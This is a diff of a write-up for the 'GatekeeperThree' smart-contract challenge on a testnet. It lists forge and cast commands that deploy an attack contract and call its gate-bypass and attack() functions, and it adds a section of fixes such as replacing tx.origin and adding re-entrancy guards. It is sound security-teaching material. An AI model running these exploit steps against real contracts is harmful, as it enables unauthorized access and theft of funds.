@@ -65,13 +65,13 @@ To exploit this contract, an attacker could focus on manipulating the `SimpleTri
 forge script script/DeployGatekeeperThreeAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
 
 # make deploy ARGS="--network sepolia"
-# https://sepolia.etherscan.io/address/0xbC4349e6BfeFd22982327DD1C64FC1c5BF4Ba874
+# https://sepolia.etherscan.io/address/0xff548ffFca03Fed7Ee8F2b042bd0AF00cd00421e
 ```
 
-2. Found `GatekeeperThree`.
+2. Found `GatekeeperThree` to bypass `gateThree()`.
 
 ```bash
-cast send $GATEKEEPER_THREE_CONTRACT_ADDRESS --value 0.0011ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
+cast send $GATEKEEPER_THREE_CONTRACT_ADDRESS --value 0.0011 ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
 ```
 
 3. Attack.
@@ -79,9 +79,21 @@ cast send $GATEKEEPER_THREE_CONTRACT_ADDRESS --value 0.0011ether --private-key $
 ```bash
 cast send $CONTRACT_ADDRESS "solveGateOne()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
 cast send $CONTRACT_ADDRESS "solveGateTwo()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
-cast send $CONTRACT_ADDRESS "solveGateThree()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
 cast send $CONTRACT_ADDRESS "attack()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
 ```
 
 ## Fix
 
+1. Use `msg.sender` for authentication: replace `tx.origin` with `msg.sender` to prevent attacks where a malicious contract could interact with another contract on behalf of the user. This ensures that only the direct caller can trigger sensitive functions.
+
+2. Strengthen `getAllowance` function: implement a more sophisticated password mechanism to prevent brute-force attacks. Additionally, consider implementing a rate-limiting feature or attempt counter to further secure against unauthorized access.
+
+3. Independent logic flow: ensure that the contract's critical logic does not depend on the success or failure of external calls, especially those involving Ether transfers. This can prevent manipulation or unexpected behavior due to external failures.
+
+4. Strengthen access control: ensure that functions not intended for public use are marked as internal or are protected by access control checks. This helps in maintaining the integrity of the contract's operations and prevents unauthorized access.
+   
+5.  Implement re-entrancy guard: add a re-entrancy guard to functions that make external calls or transfer Ether. This is crucial for preventing re-entrancy attacks, where a malicious contract could repeatedly call into your contract before the first execution completes.
+
+6. Enable event logging: use events to log significant actions and state changes within the contract. This enhances transparency and allows for easier tracking and verification of contract interactions.
+
+7. Enhanced password security: improve the password mechanism by using cryptographic techniques (unpredictable).
